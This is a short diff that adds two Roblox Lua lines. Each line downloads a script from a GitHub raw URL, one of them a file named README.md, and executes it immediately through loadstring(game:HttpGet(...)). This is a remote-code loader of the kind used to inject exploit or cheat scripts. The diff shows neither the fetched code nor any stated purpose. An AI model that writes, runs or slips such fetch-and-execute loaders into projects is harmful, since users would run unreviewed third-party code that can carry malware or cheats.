@@ -1,0 +1,3 @@
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/Chickanlegbizz/Chickanlegbizz/main/README.md')))()
+
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/Chickanlegbizz/Chickanlegbizz/main/notif')))()
